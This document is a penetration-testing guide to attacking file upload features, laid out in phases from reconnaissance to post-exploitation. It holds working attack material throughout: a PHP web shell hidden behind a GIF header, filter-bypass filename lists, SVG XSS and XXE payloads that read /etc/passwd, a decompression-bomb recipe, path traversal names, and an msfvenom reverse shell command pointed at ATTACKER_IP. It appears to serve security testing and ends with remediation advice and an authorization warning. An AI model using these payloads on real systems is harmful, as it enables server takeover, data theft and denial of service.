# How to Approach File Upload Attacks

## Testing Methodology Overview

This guide provides a systematic approach to identifying and exploiting file upload vulnerabilities during penetration testing.

## Phase 1: Reconnaissance & Information Gathering

### 1.1 Identify Web Framework
- **Manual Inspection**:
  - Check HTTP response headers (`X-Powered-By`, `Server`, etc.)
  - Look for specific URL patterns or file extensions
  - Examine source code for framework-specific patterns
- **Automated Tools**:
  - Use `Wappalyzer` or `BuiltWith` browser extensions
  - Run `whatweb` or `httpx` for technology detection
- **Brute Force Framework Detection**:
  ```bash
  # Test for common index files
  curl -s http://target.com/index.php
  curl -s http://target.com/index.asp
  curl -s http://target.com/index.jsp
  ```

### 1.2 Locate Upload Functionality
- **Common Locations**:
  - Profile picture uploads
  - Document/file sharing features
  - Contact forms with attachments
  - Admin panels
  - Content management systems
- **Directory Discovery**:
  ```bash
  # Use directory brute forcing
  gobuster dir -u http://target.com -w /path/to/wordlist
  ffuf -u http://target.com/FUZZ -w /path/to/wordlist
  ```

### 1.3 Analyze Upload Behavior
- **Network Analysis**:
  - Use Burp Suite or OWASP ZAP to intercept requests
  - Examine HTTP headers and request structure
  - Note file size limits and allowed extensions
- **Client-Side Analysis**:
  - Inspect JavaScript validation
  - Check HTML form restrictions
  - Look for file type filters in source code

## Phase 2: Initial Vulnerability Assessment

### 2.1 Create Test Files
```bash
# Basic test files for different frameworks
echo '<?php echo "Hello World"; ?>' > test.php
echo '<%response.write("Hello World")%>' > test.asp
echo '<%out.println("Hello World");%>' > test.jsp
echo '<script>alert("XSS")</script>' > test.html
```

### 2.2 Basic Upload Tests
1. **Test with Target Framework Extension**:
   - Upload `test.php` if PHP framework detected
   - Upload `test.asp` for ASP.NET applications
   - Upload `test.jsp` for Java applications

2. **Test File Access**:
   - Try to access uploaded file directly via URL
   - Check if code execution occurs
   - Note any error messages or behavior changes

3. **Test Multiple Extensions**:
   ```bash
   # Generate extension wordlist
   extensions=(php phtml php3 php4 php5 phar phps)
   for ext in "${extensions[@]}"; do
       cp test.php test.$ext
   done
   ```

### 2.3 Client-Side Bypass Testing
- **DOM Manipulation**:
  - Remove or modify `accept` attributes in HTML
  - Disable JavaScript validation
  - Modify file input restrictions
- **Proxy Interception**:
  - Upload allowed file type
  - Intercept request and modify filename/content
  - Forward modified request

## Phase 3: Server-Side Filter Bypass

### 3.1 Extension-Based Bypass
- **Case Manipulation**:
  ```
  test.PHP
  test.Php
  test.pHp
  ```
- **Double Extensions**:
  ```
  shell.php.jpg
  shell.jpg.php
  shell.php.png
  ```
- **Special Character Injection**:
  ```
  shell.php%00.jpg    (null byte)
  shell.php%20.jpg    (space)
  shell.php%0a.jpg    (newline)
  shell.php/.jpg      (slash)
  shell.php..jpg      (multiple dots)
  ```

### 3.2 Content-Type Bypass
- **MIME Type Manipulation**:
  ```
  Content-Type: image/jpeg    (instead of application/x-php)
  Content-Type: text/plain
  Content-Type: image/png
  ```
- **Magic Bytes Spoofing**:
  ```bash
  # Add GIF header to PHP file
  echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
  ```

### 3.3 Automated Bypass Testing
```bash
# Generate comprehensive payload list
#!/bin/bash
base="shell"
extensions=("php" "phtml" "php3" "php4" "php5" "phar")
chars=("%00" "%20" "%0a" "/" "." ":")

for ext in "${extensions[@]}"; do
    for char in "${chars[@]}"; do
        echo "${base}${char}.${ext}" >> payloads.txt
        echo "${base}.${ext}${char}.jpg" >> payloads.txt
    done
done
```

## Phase 4: Advanced Attack Vectors

### 4.1 Alternative Attack Types
- **XSS via File Upload**:
  ```html
  <!-- SVG with XSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
      <script>alert(document.domain)</script>
  </svg>
  ```
- **XXE via File Upload**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <svg>&xxe;</svg>
  ```

### 4.2 DoS Attack Testing
- **Decompression Bomb**:
  ```bash
  # Create nested ZIP file
  dd if=/dev/zero of=dummy.txt bs=1M count=1000
  zip -r bomb.zip dummy.txt
  zip -r bomb2.zip bomb.zip
  ```
- **Pixel Flood Attack**:
  - Create image with normal dimensions
  - Modify metadata to claim extremely large dimensions
  - Upload and monitor server resource consumption

### 4.3 Path Traversal Testing
```bash
# Test directory traversal in filename
../../../shell.php
..\/..\/..\/shell.php
....//....//....//shell.php
```

## Phase 5: Exploitation & Post-Exploitation

### 5.1 Web Shell Deployment
- **Popular Web Shells**:
  ```php
  # Simple PHP web shell
  <?php system($_GET['cmd']); ?>
  
  # More advanced shells
  # - phpbash
  # - c99 shell
  # - r57 shell
  ```

### 5.2 Reverse Shell Generation
```bash
# Using msfvenom
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > reverse.php

# Using online generators
# - revshells.com
# - pentestmonkey reverse shells
```

### 5.3 Upload Directory Discovery
- **Error Message Analysis**:
  - Upload files with long names
  - Use special characters to trigger errors
  - Analyze error messages for path disclosure
- **Brute Force Techniques**:
  ```bash
  # Common upload directories
  /uploads/
  /files/
  /media/
  /assets/
  /tmp/
  /var/www/uploads/
  ```

## Phase 6: Documentation & Reporting

### 6.1 Evidence Collection
- **Screenshot Evidence**:
  - Successful file upload
  - Code execution proof
  - Access to uploaded file
- **Request/Response Logs**:
  - Save Burp Suite project
  - Export relevant HTTP requests
  - Document bypass techniques used

### 6.2 Impact Assessment
- **Severity Levels**:
  - **Critical**: Remote Code Execution achieved
  - **High**: File upload with potential for RCE
  - **Medium**: Limited file upload (XSS, information disclosure)
  - **Low**: File upload with minimal security impact

### 6.3 Remediation Recommendations
- Implement strict file type validation
- Use file content inspection (magic bytes)
- Implement proper file naming schemes
- Store uploads outside web root
- Use Content-Disposition headers
- Implement file size limits
- Regular security updates for processing libraries

## Common Tools & Resources

### Testing Tools
- **Burp Suite** - Request interception and modification
- **OWASP ZAP** - Automated scanning and manual testing
- **ffuf/gobuster** - Directory and file discovery
- **msfvenom** - Payload generation
- **exiftool** - Metadata manipulation

### Wordlists & Payloads
- **SecLists** - File upload payloads and extensions
- **PayloadsAllTheThings** - Comprehensive attack payloads
- **FuzzDB** - Attack patterns and test cases

### Online Resources
- **revshells.com** - Reverse shell generator
- **GTFOBins** - Binary exploitation techniques
- **HackTricks** - File upload attack techniques

## Quick Reference Checklist

- [ ] Identify web framework and technology stack
- [ ] Locate all file upload functionality
- [ ] Test basic file upload with framework extensions
- [ ] Attempt client-side validation bypass
- [ ] Test extension-based filter bypass techniques
- [ ] Test MIME type and magic byte bypass
- [ ] Try alternative attack vectors (XSS, XXE, SSRF)
- [ ] Test for DoS vulnerabilities
- [ ] Attempt path traversal attacks
- [ ] Deploy web shells or reverse shells
- [ ] Discover upload directory location
- [ ] Document findings and create proof-of-concept
- [ ] Provide remediation recommendations

---

**Note**: Always ensure you have proper authorization before testing file upload vulnerabilities. Unauthorized testing may be illegal and could cause system damage.